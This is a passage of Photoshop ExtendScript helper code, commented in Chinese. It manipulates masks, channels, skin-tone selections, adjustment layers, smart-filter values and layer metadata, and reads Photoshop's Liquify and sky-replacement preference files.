  delMask: function () { //删除当前图层蒙板
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Msk '));
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('delete'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  getChannelByName: function (iName) { //获取通道
    try {
      return app.activeDocument.channels.getByName(iName);
    } catch (e) { return !1 }
  },
  selectChannleByName: function (iName, isTID) { //选择通道
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      if (isTID) ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID(iName));
      else ref1.putName(cTID('Chnl'), iName);
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('select'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  makeMask: function (isBlack) { //创建蒙板
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Msk '));
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('delete'), desc1, DialogModes.NO);
    } catch (e) { }
    var desc1 = new ActionDescriptor();
    desc1.putClass(cTID('Nw  '), cTID('Chnl'));
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Msk '));
    desc1.putReference(cTID('At  '), ref1);
    if (this.getSelectionBounds()) desc1.putEnumerated(cTID('Usng'), cTID('UsrM'), cTID(isBlack ? 'RvlS' : 'HdSl'));
    else desc1.putEnumerated(cTID('Usng'), cTID('UsrM'), cTID(isBlack ? 'HdAl' : 'RvlA'));
    app.executeAction(sTID('make'), desc1, DialogModes.NO);
  },
  makeLayerTrsp: function (iName) { //创建图层透明选区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Trsp'));
      if (iName) ref2.putName(cTID('Lyr '), iName);
      desc1.putReference(cTID('T   '), ref2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  makeChannelTrsp: function (iName, isTID) { //创建通道透明选区
    //isTID:是否是颜色通道
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      if (isTID) ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID(iName));
      else ref2.putName(cTID('Chnl'), iName);
      desc1.putReference(cTID('T   '), ref2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  makeChannelTrspRGB: function () { //创建RGB通道透明选区
    try {
      var d = new ActionDescriptor();
      var d1 = new ActionDescriptor();
      d1.putEnumerated(sTID("colorIndicates"), sTID("maskIndicator"), sTID("maskedAreas"));
      var d2 = new ActionDescriptor();
      d2.putDouble(sTID("red"), 255);
      d2.putDouble(sTID("green"), 0);
      d2.putDouble(sTID("blue"), 0);
      d1.putObject(sTID("color"), sTID("RGBColor"), d2);
      d1.putInteger(sTID("opacity"), 50);
      d.putObject(sTID("new"), sTID("channel"), d1);
      app.executeAction(sTID("make"), d, DialogModes.NO);

      // apply RGB to alpha channel
      var d = new ActionDescriptor();
      var d1 = new ActionDescriptor();
      var r = new ActionReference();
      r.putEnumerated(sTID("channel"), sTID("channel"), sTID("RGB"));
      r.putEnumerated(sTID("layer"), sTID("ordinal"), sTID("merged"));
      d1.putReference(sTID("to"), r);
      d1.putBoolean(sTID("preserveTransparency"), true);
      d.putObject(sTID("with"), sTID("calculation"), d1);
      app.executeAction(sTID("applyImageEvent"), d, DialogModes.NO);

      // make selection from alpha channel
      var d = new ActionDescriptor();
      var r = new ActionReference();
      r.putProperty(sTID("channel"), sTID("selection"));
      d.putReference(sTID("null"), r);
      var r1 = new ActionReference();
      r1.putEnumerated(sTID("channel"), sTID("ordinal"), sTID("targetEnum"));
      d.putReference(sTID("to"), r1);
      app.executeAction(sTID("set"), d, DialogModes.NO);
      var d = new ActionDescriptor();

      // delete temp alpha channel
      var r = new ActionReference();
      r.putEnumerated(sTID("channel"), sTID("ordinal"), sTID("targetEnum"));
      d.putReference(sTID("null"), r);
      app.executeAction(sTID("delete"), d, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  makeSkinSelect: function () { //创建皮肤选区
    var layerID = app.activeDocument.activeLayer.id;

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putClass(cTID('AdjL'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putString(cTID('Nm  '), "$XT|TEMP|adjustColorLuminosity");
    desc2.putEnumerated(cTID('Clr '), cTID('Clr '), cTID('Rd  '));
    var desc3 = new ActionDescriptor();
    desc3.putEnumerated(sTID("presetKind"), sTID("presetKindType"), sTID("presetKindCustom"));
    desc3.putInteger(cTID('Rd  '), 100);
    desc3.putInteger(cTID('Yllw'), 200);
    desc3.putInteger(cTID('Grn '), -200);
    desc3.putInteger(cTID('Cyn '), -200);
    desc3.putInteger(cTID('Bl  '), -200);
    desc3.putInteger(cTID('Mgnt'), -200);
    desc3.putBoolean(sTID("useTint"), false);
    var desc4 = new ActionDescriptor();
    desc4.putDouble(cTID('Rd  '), 225.000457763672);
    desc4.putDouble(cTID('Grn '), 211.000671386719);
    desc4.putDouble(cTID('Bl  '), 179.001159667969);
    desc3.putObject(sTID("tintColor"), sTID("RGBColor"), desc4);
    desc2.putObject(cTID('Type'), cTID('BanW'), desc3);
    desc1.putObject(cTID('Usng'), cTID('AdjL'), desc2);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var list1 = new ActionList();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
    list1.putReference(ref1);
    desc1.putList(cTID('null'), list1);
    app.executeAction(sTID('hide'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Frnt'));
    desc1.putReference(cTID('T   '), ref2);
    app.executeAction(sTID('move'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putClass(cTID('AdjL'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putString(cTID('Nm  '), "$XT|TEMP|maskSkin");
    var desc3 = new ActionDescriptor();
    desc3.putEnumerated(sTID("presetKind"), sTID("presetKindType"), sTID("presetKindDefault"));
    desc2.putObject(cTID('Type'), cTID('Crvs'), desc3);
    desc1.putObject(cTID('Usng'), cTID('AdjL'), desc2);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    desc1.putInteger(cTID('Fzns'), 115);
    desc1.putEnumerated(cTID('Clrs'), cTID('Clrs'), sTID("skinTone"));
    desc1.putBoolean(sTID("UseFacesKey"), true);
    desc1.putInteger(sTID("colorModel"), 1);
    desc1.putInteger(sTID("dimension"), 5);
    desc1.putInteger(sTID("posGaussClusters"), 1);
    desc1.putDouble(sTID("posGaussTolerance"), 0.45098876953125);
    desc1.putDouble(sTID("posSpaGaussTolerance"), 1);
    var list1 = new ActionList();
    list1.putDouble(0.83053588867188);
    list1.putDouble(0.83053588867188);
    list1.putDouble(0.45098876953125);
    list1.putDouble(0.5208740234375);
    list1.putDouble(0.5208740234375);
    list1.putDouble(0.14882630109787);
    list1.putDouble(0.51644897460938);
    list1.putDouble(0.51644897460938);
    list1.putDouble(0.14882630109787);
    list1.putDouble(0.40145874023438);
    list1.putDouble(0.40145874023438);
    list1.putDouble(1);
    list1.putDouble(0.31716918945313);
    list1.putDouble(0.31716918945313);
    list1.putDouble(1);
    desc1.putList(sTID("posGaussParams"), list1);
    desc1.putInteger(sTID("negGaussClusters"), 0);
    desc1.putDouble(sTID("negGaussTolerance"), 0);
    desc1.putDouble(sTID("negSpaGaussTolerance"), 1);
    var list2 = new ActionList();
    desc1.putList(sTID("negGaussParams"), list2);
    app.executeAction(sTID('colorRange'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putClass(cTID('Lyr '));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putString(cTID('Nm  '), "$XT|TEMP|skinAreas");
    desc1.putObject(cTID('Usng'), cTID('Lyr '), desc2);
    desc1.putInteger(cTID('LyrI'), 26);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Msk '));
    ref1.putName(cTID('Lyr '), "$XT|TEMP|maskSkin");
    desc2.putReference(cTID('T   '), ref1);
    desc1.putObject(cTID('With'), cTID('Clcl'), desc2);
    app.executeAction(sTID('applyImageEvent'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putName(cTID('Lyr '), "$XT|TEMP|maskSkin");
    desc1.putReference(cTID('null'), ref1);
    desc1.putBoolean(cTID('MkVs'), false);
    var list1 = new ActionList();
    list1.putInteger(34);
    desc1.putList(cTID('LyrI'), list1);
    app.executeAction(sTID('select'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var list1 = new ActionList();
    list1.putInteger(34);
    desc1.putList(cTID('LyrI'), list1);
    app.executeAction(sTID('delete'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var list1 = new ActionList();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
    list1.putReference(ref1);
    desc1.putList(cTID('null'), list1);
    app.executeAction(sTID('show'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putName(cTID('Lyr '), "$XT|TEMP|skinAreas");
    desc1.putReference(cTID('null'), ref1);
    desc1.putBoolean(cTID('MkVs'), false);
    var list1 = new ActionList();
    list1.putInteger(35);
    desc1.putList(cTID('LyrI'), list1);
    app.executeAction(sTID('select'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putEnumerated(cTID('Md  '), cTID('BlnM'), sTID("linearBurn"));
    var list1 = new ActionList();
    var desc3 = new ActionDescriptor();
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Rd  '));
    desc3.putReference(cTID('Chnl'), ref2);
    desc3.putInteger(cTID('SrcB'), 0);
    desc3.putInteger(cTID('Srcl'), 0);
    desc3.putInteger(cTID('SrcW'), 0);
    desc3.putInteger(cTID('Srcm'), 255);
    desc3.putInteger(cTID('DstB'), 0);
    desc3.putInteger(cTID('Dstl'), 0);
    desc3.putInteger(cTID('DstW'), 255);
    desc3.putInteger(cTID('Dstt'), 255);
    list1.putObject(cTID('Blnd'), desc3);
    var desc4 = new ActionDescriptor();
    var ref3 = new ActionReference();
    ref3.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Grn '));
    desc4.putReference(cTID('Chnl'), ref3);
    desc4.putInteger(cTID('SrcB'), 0);
    desc4.putInteger(cTID('Srcl'), 0);
    desc4.putInteger(cTID('SrcW'), 0);
    desc4.putInteger(cTID('Srcm'), 255);
    desc4.putInteger(cTID('DstB'), 0);
    desc4.putInteger(cTID('Dstl'), 0);
    desc4.putInteger(cTID('DstW'), 255);
    desc4.putInteger(cTID('Dstt'), 255);
    list1.putObject(cTID('Blnd'), desc4);
    var desc5 = new ActionDescriptor();
    var ref4 = new ActionReference();
    ref4.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Bl  '));
    desc5.putReference(cTID('Chnl'), ref4);
    desc5.putInteger(cTID('SrcB'), 0);
    desc5.putInteger(cTID('Srcl'), 0);
    desc5.putInteger(cTID('SrcW'), 0);
    desc5.putInteger(cTID('Srcm'), 255);
    desc5.putInteger(cTID('DstB'), 0);
    desc5.putInteger(cTID('Dstl'), 0);
    desc5.putInteger(cTID('DstW'), 255);
    desc5.putInteger(cTID('Dstt'), 255);
    list1.putObject(cTID('Blnd'), desc5);
    desc2.putList(cTID('Blnd'), list1);
    desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);

    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putProperty(cTID('Chnl'), sTID("selection"));
    desc1.putReference(cTID('null'), ref1);
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    desc1.putReference(cTID('T   '), ref2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);

    this.selectLayerWith("$XT|TEMP|adjustColorLuminosity");
    this.deleteLayer();
    this.selectLayerByID(layerID);
    // this.makeMask(1);
  },
  setMaskOpacity: function (iOpacity) { //设置蒙板密度
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(sTID("userMaskDensity"), cTID('#Prc'), iOpacity);
      desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  setMaskFeather: function (iFeather) { //设置蒙板羽化
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(sTID("userMaskFeather"), cTID('#Pxl'), iFeather);
      desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  setSelFeather: function (iFeather) { //设置选区羽化
    try {
      var desc1 = new ActionDescriptor();
      desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), iFeather);
      desc1.putBoolean(sTID("selectionModifyEffectAtCanvasBounds"), false);
      app.executeAction(sTID('feather'), desc1, DialogModes.NO);
      $._Kaibei.toggleEdges();
      return !0
    } catch (e) { return !1 }
  },
  adjustMask: function (iFeather, adjustEdge) { //调整蒙板边缘
    try {
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(sTID("presetKind"), sTID("presetKindType"), sTID("presetKindCustom"));
      desc1.putInteger(sTID("smartBrushRadius"), 0);//250
      desc1.putInteger(sTID("smartBrushSmooth"), 0);
      desc1.putUnitDouble(sTID("smartBrushFeather"), cTID('#Pxl'), iFeather);
      desc1.putUnitDouble(sTID("smartBrushContrast"), cTID('#Prc'), 0);
      desc1.putUnitDouble(sTID("smartBrushShiftEdge"), cTID('#Prc'), -adjustEdge);
      desc1.putBoolean(sTID("sampleAllLayers"), false);
      desc1.putBoolean(sTID("smartBrushUseSmartRadius"), true);//
      desc1.putBoolean(sTID("smartBrushUseDeepMatte"), false);
      desc1.putBoolean(sTID("autoTrimap"), false);
      desc1.putBoolean(sTID("smartBrushDecontaminate"), false);
      desc1.putUnitDouble(sTID("smartBrushDeconAmount"), cTID('#Prc'), 100);
      desc1.putEnumerated(sTID("refineEdgeOutput"), sTID("refineEdgeOutput"), sTID("selectionOutputToUserMask"));
      app.executeAction(sTID('smartBrushWorkspace'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  magicEraserFun: function () { //智能瑕疵修复
    try {
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), sTID("contentAware"));
      desc1.putBoolean(sTID("contentAwareColorAdaptationFill"), true);
      desc1.putBoolean(sTID("contentAwareRotateFill"), true);
      desc1.putBoolean(sTID("contentAwareScaleFill"), false);
      desc1.putBoolean(sTID("contentAwareMirrorFill"), false);
      desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
      desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
      desc1.putBoolean(cTID("PrsT"), true);
      app.executeAction(sTID('fill'), desc1, DialogModes.NO);
      // var desc1 = new ActionDescriptor();
      // desc1.putEnumerated(sTID("cafSamplingRegion"), sTID("cafSamplingRegion"), sTID("cafSamplingRegionAuto"));
      // desc1.putBoolean(sTID("cafSampleAllLayers"), false);
      // desc1.putEnumerated(sTID("cafColorAdaptationLevel"), sTID("cafColorAdaptationLevel"), sTID("cafColorAdaptationDefault"));
      // desc1.putEnumerated(sTID("cafRotationAmount"), sTID("cafRotationAmount"), sTID("cafRotationAmountNone"));
      // desc1.putBoolean(sTID("cafScale"), false);
      // desc1.putBoolean(sTID("cafMirror"), false);
      // desc1.putEnumerated(sTID("cafOutput"), sTID("cafOutput"), sTID("cafOutputToCurrentLayer"));
      // app.executeAction(sTID('cafWorkspace'), desc1, DialogModes.NO);
      this.deSelection();
    } catch (e) { }
  },
  setColorLayerByName: function (HexOrRgb, iName) {
    if (iName) {
      var tName = app.activeDocument.activeLayer.name;
      this.selectLayerByName(iName);
    }
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(sTID("contentLayer"), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    var desc3 = new ActionDescriptor();
    var rgb = this.hexToRgb(HexOrRgb);
    desc3.putDouble(cTID('Rd  '), rgb[0]);
    desc3.putDouble(cTID('Grn '), rgb[1]);
    desc3.putDouble(cTID('Bl  '), rgb[2]);
    desc2.putObject(cTID('Clr '), sTID("RGBColor"), desc3);
    desc1.putObject(cTID('T   '), sTID("solidColorLayer"), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    if (iName) {
      this.selectLayerByName(tName, true);
      this.closeAllGroups();
    }
  },
  setColorLayerHueByName: function (iName, iHsb) {
    var tName = app.activeDocument.activeLayer.name;
    this.selectLayerByName(iName);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(sTID("contentLayer"), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    var desc3 = new ActionDescriptor();
    desc3.putDouble(sTID('hue'), iHsb.hue || 20);
    desc3.putDouble(sTID('saturation'), iHsb.saturation || 18);
    desc3.putDouble(sTID('brightness'), iHsb.brightness || 95);
    desc2.putObject(cTID('Clr '), sTID("HSBColorClass"), desc3);
    desc1.putObject(cTID('T   '), sTID("solidColorLayer"), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    this.selectLayerByName(tName, true);
    this.closeAllGroups();
  },
  getColorLayerByName: function (iName, cType) {
    try {
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iName || app.activeDocument.activeLayer.name);
      var desc1 = app.executeActionGet(ref1);
      var desc2 = desc1.getList(cTID("Adjs")).getObjectValue(0).getObjectValue(cTID("Clr "));
      var color = this.createRGBColor(desc2.getDouble(sTID("red")), desc2.getDouble(sTID("green")), desc2.getDouble(sTID("blue")));
      switch (cType) {
        case 'hex':
          return color.rgb.hexValue;
          break;
        case 'hsb':
          return [color.hsb.hue, color.hsb.saturation, color.hsb.brightness];
          break;
        default:
          return [color.rgb.red, color.rgb.green, color.rgb.blue]
      }
    } catch (e) { return !1 }
  },
  setSaturationByName: function (iName, vibrance, Strt) {
    var tName = app.activeDocument.activeLayer.name;
    this.selectLayerByName(iName);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(sTID("contentLayer"), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putInteger(sTID("vibrance"), vibrance);
    desc2.putInteger(cTID('Strt'), Strt);
    desc1.putObject(cTID('T   '), sTID("vibrance"), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    if (vibrance < 0) this.setLayerColor('gray');
    else this.setLayerColor('none');
    this.selectLayerByName(tName, true);
    this.closeAllGroups();
  },
  getPhotoFilterColorByName: function (iName) { //获取照片滤镜颜色
    // this.getLegacyContentDataByName
    var color = [];
    var ref1 = new ActionReference();
    ref1.putName(cTID('Lyr '), iName);
    var raw = app.executeActionGet(ref1).getList(cTID('Adjs')).getObjectValue(0).getData(sTID('legacyContentData'));
    color.push(this.byteToColor(this.readByte(raw, 3), this.readByte(raw, 4)));
    color.push(this.byteToColor(this.readByte(raw, 5), this.readByte(raw, 6)));
    color.push(this.byteToColor(this.readByte(raw, 7), this.readByte(raw, 8)));
    return color
    // var rgb = this.createLABColor(color).rgb;
    // return [Math.round(rgb.red),Math.round(rgb.green),Math.round(rgb.blue)];
  },
  createRGBColor: function (r, g, b) { //创建RGB颜色对象
    var c = new RGBColor();
    if (r instanceof Array) {
      b = r[2]; g = r[1]; r = r[0];
    }
    c.red = Math.round(r); c.green = Math.round(g); c.blue = Math.round(b);
    var sc = new SolidColor();
    sc.rgb = c;
    return sc;
  },
  createLABColor: function (l, a, b) { //创建LAB颜色对象
    var c = new LabColor();
    if (l instanceof Array) {
      b = l[2]; a = l[1]; l = l[0];
    }
    c.l = Math.round(l); c.a = Math.round(a); c.b = Math.round(b);
    var sc = new SolidColor();
    sc.lab = c;
    return sc;
  },
  readInteger: function (str, pointer) { //转换调整层数值
    var byte1 = str.charCodeAt(pointer);
    var byte2 = str.charCodeAt(pointer + 1);
    var singedsShort = (byte1 << 8) + byte2;
    if (singedsShort > 0x7FFF) {
      singedsShort = 0xFFFF0000 ^ singedsShort;
    }
    return singedsShort;
  },
  readAngle: function (str, pointer) { //转换调整层角度值
    var b1 = str.charCodeAt(pointer);
    var b2 = str.charCodeAt(pointer + 1);
    if (b1 == 0) {
      var ss = b2;
    } else {
      var ss = b2 + 104;
    }
    return ss;
  },
  readByte: function (str, pointer) { //读取字节值
    var b1 = str.charCodeAt(pointer);
    var b2 = str.charCodeAt(pointer + 1);
    return b2;
  },
  byteToColor: function (i, x) { //字节转颜色值-128~127
    //i:第1个字节(商),x:第2个字节(余数)
    if (i > 49) i -= 256;
    return Math.round((i * 256 + x) / 100);
    //颜色值转字节,x:颜色值,quot:商,mod:余数
    // var a = x*100;
    // return {quot:parseInt(a/256),mod:a%256};
  },
  getLegacyContentDataByName: function (iName, iPoint) { //获取调整层数值
    try {
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iName);
      var raw = app.executeActionGet(ref1).getList(cTID('Adjs')).getObjectValue(0).getData(sTID('legacyContentData'));
      // for(var i=0;i<50;i++)$.writeln(i+":"+readInteger(raw,i)); //遍历数值
      return this.readByte(raw, iPoint)
    } catch (e) { }
  },
  // getSaturationByName: function(iName){
  //   var ref1 = new ActionReference();
  //   ref1.putName(cTID('Lyr '), iName);
  //   var raw = app.executeActionGet(ref1).getList(cTID('Adjs')).getObjectValue(0).getData(sTID('legacyContentData'));
  //   return raw.toString(10)
  // },
  setShadowHighlight: function (iName, dark, light) { //设置阴影/高光值
    var tName = app.activeDocument.activeLayer.name;
    this.selectLayerByName(iName);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putIndex(sTID("filterFX"), 1);
    ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    var desc3 = new ActionDescriptor();
    var desc4 = new ActionDescriptor();
    desc4.putUnitDouble(cTID('Amnt'), cTID('#Prc'), dark);
    desc4.putUnitDouble(cTID('Wdth'), cTID('#Prc'), 50);
    desc4.putInteger(cTID('Rds '), 100);
    desc3.putObject(sTID('shadowMode'), sTID("adaptCorrectTones"), desc4);
    var desc5 = new ActionDescriptor();
    desc5.putUnitDouble(cTID('Amnt'), cTID('#Prc'), light);
    desc5.putUnitDouble(cTID('Wdth'), cTID('#Prc'), 20);
    desc5.putInteger(cTID('Rds '), 100);
    desc3.putObject(sTID('highlightMode'), sTID("adaptCorrectTones"), desc5);
    desc3.putDouble(cTID('BlcC'), 0.01);
    desc3.putDouble(cTID('WhtC'), 0.01);
    desc3.putInteger(cTID('Cntr'), 50);
    desc3.putInteger(cTID('ClrC'), 20);
    desc2.putObject(cTID('Fltr'), sTID("adaptCorrect"), desc3);
    desc1.putObject(sTID("filterFX"), sTID("filterFX"), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    this.selectLayerByName(tName);
    this.closeAllGroups();
  },
  getShadowHighlight: function (iName) { //获取阴影/高光值
    var val = {};
    var ref1 = new ActionReference();
    ref1.putName(cTID('Lyr '), iName);
    var desc1 = app.executeActionGet(ref1);
    var desc2 = desc1.getObjectValue(sTID("smartObject")).getList(sTID('filterFX')).getObjectValue(0).getObjectValue(cTID("Fltr"));
    val.dark = desc2.getObjectValue(sTID("shadowMode")).getDouble(sTID("amount"));
    val.light = desc2.getObjectValue(sTID("highlightMode")).getDouble(sTID("amount"));
    return val;
  },
  setFilterRadiusByName: function (iValue, iLayerName) { //设置智能对象半径值
    var result = !0;
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putIndex(sTID("filterFX"), 1);
      if (iLayerName) ref1.putName(cTID('Lyr '), iLayerName);
      else ref1.putEnumerated(cTID("Lyr "), cTID("Ordn"), cTID("Trgt"));
      desc1.putReference(cTID("null"), ref1);
      var desc2 = new ActionDescriptor();
      var desc3 = new ActionDescriptor();
      desc3.putUnitDouble(cTID("Rds "), cTID("#Pxl"), iValue);
      desc2.putObject(cTID("Fltr"), cTID("GsnB"), desc3);
      desc1.putObject(sTID("filterFX"), sTID("filterFX"), desc2);
      app.executeAction(cTID("setd"), desc1, DialogModes.NO);
    } catch (e) { result = !1 }
    return result
  },
  getFilterDoubleByName: function (iLayerName, sKey, iIndex) { //获取智能对象半径值
    iIndex = iIndex || 0;
    var result = !1;
    try {
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iLayerName);
      var desc1 = app.executeActionGet(ref1);
      result = desc1.getObjectValue(sTID("smartObject")).getList(sTID('filterFX')).getObjectValue(iIndex).getObjectValue(cTID("Fltr")).getDouble(sTID(sKey));
    } catch (e) { }
    return result
  },
  getFilterHaloByName: function (iLayerName, iIndex) { //获取智能对象晕影值
    iIndex = iIndex || 0;
    var result = {};
    try {
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iLayerName);
      var desc1 = app.executeActionGet(ref1);
      var desc = desc1.getObjectValue(sTID("smartObject")).getList(sTID('filterFX')).getObjectValue(iIndex).getObjectValue(cTID("Fltr"));
      result.halo = desc.getInteger(cTID('PCVA'));
      result.midpoint = desc.getInteger(cTID('PCVM'));
      result.roundness = desc.getInteger(cTID('PCVR'));
      result.eclosion = desc.getInteger(cTID('PCVF'));
    } catch (e) { result = !1 }
    return result
  },
  getLayerMetadata: function (iLayer) { //读取图层Metadata
    try {
      iLayer = iLayer || app.activeDocument.activeLayer;
      return JSON.parse(iLayer.xmpMetadata.rawData)
    } catch (e) { }
  },
  setLayerMetadata: function (iMetadata, iLayer) { //写入图层Metadata
    try {
      iLayer = iLayer || app.activeDocument.activeLayer;
      iLayer.xmpMetadata.rawData = (typeof iMetadata === 'string') ? iMetadata : JSON.stringify(iMetadata);
      return !0
    } catch (e) { }
  },
  getLiquifyLastFaceMeshData: function () { //获取最后一次人脸液化数据
    try {
      var meshFile = File(app.preferencesFolder + '/' + localize('$$$/Liquify/Prefs/MeshFileName=Liquify Last Mesh.psp'));
      if (meshFile.exists) {
        meshFile.open('r');
        meshFile.encoding = 'BINARY';
        var mesh = meshFile.read();
        meshFile.close();
        var start = mesh.search(/faceMesh/i) - 14;
        // var faceMesh = mesh.slice(start,mesh.length);
        return this.binToHex(mesh.slice(start, mesh.length));
      }
    } catch (e) { }
  },
  getSkyReplacementLastID: function () { //获取最后一次天空ID
    try {
      var meshFile = File(app.preferencesFolder + localize('/Sky_Presets/MRUSkies.psp'));
      if (!meshFile.exists) meshFile = File(app.preferencesFolder + localize('/Sky_Presets/Skies.psp'));
      if (meshFile.exists) {
        meshFile.open('r');
        meshFile.encoding = 'BINARY';
        var mesh = meshFile.read();
        meshFile.close();
        var start = mesh.search(/SzidTEXT/i) + 12;
        return this.hexToStr(this.binToHex(mesh.slice(start, start + 72)));
      }
    } catch (e) { }
    return 'd36f6769-1c16-f641-bac6-aff4f13fa601'
  },
  getPlacedLayerPath: function (iName) { //获取链接智能对象文件路径
    try {
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iName || app.activeDocument.activeLayer.name);
      var desc1 = app.executeActionGet(ref1);
      return desc1.getObjectValue(sTID("smartObject")).getPath(cTID('Lnk ')).fsName;
    } catch (e) { }
  },
